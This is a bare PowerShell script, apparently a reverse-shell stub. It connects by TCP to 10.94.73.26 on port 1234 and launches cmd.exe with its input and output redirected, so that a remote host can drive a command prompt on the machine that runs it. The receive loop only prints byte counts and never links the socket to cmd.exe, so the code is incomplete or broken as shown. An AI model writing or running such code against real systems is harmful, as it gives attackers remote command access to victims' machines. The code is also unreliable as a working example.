$port = 1234
$ip = "10.94.73.26"

if(Test-Connection -BufferSize 32 -Count 1 -Quiet -ComputerName $ip)
{
    $socket = new-object System.Net.Sockets.TcpClient
    $socket.Connect($ip, $port)
    $socketstream = $socket.GetStream()
    $recv = New-Object Byte[] $socket.ReceiveBufferSize
    $encoding = New-Object System.Text.ASCIIEncoding
    $process = New-Object System.Diagnostics.Process
    $process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
    $process.StartInfo.RedirectStandardInput = 1
    $process.StartInfo.RedirectStandardOutput = 1
    $process.StartInfo.UseShellExecute = 0
    $process.Start()

#Création des tampons mémoire pour les entrées et sorties
$inputstream = $process.StandardInput;
$outputstream = $process.StandardOutput;

    while ($socket.Connected)
    {
        $Read = $socketstream.Read($recv, 0, $recv.Length)
        Write-Host $Read
    }
}